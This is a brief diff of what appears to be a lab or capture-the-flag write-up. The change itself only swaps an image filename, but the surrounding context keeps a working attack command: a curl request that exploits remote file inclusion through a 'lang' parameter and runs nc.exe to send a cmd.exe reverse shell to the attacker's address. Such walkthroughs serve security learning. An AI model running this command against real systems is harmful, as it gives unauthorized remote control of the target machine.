@@ -47,7 +47,7 @@ This works! We can now get a reverse shell using `nc.exe`.
 <strong>curl 'http://10.129.229.6/blog/?lang=\\10.10.14.13\share\cmd.php&#x26;cmd=C:\windows\tasks\nc.exe+-e+cmd.exe+10.10.14.13+4444'
 </strong></code></pre>
 
-<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (158) (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
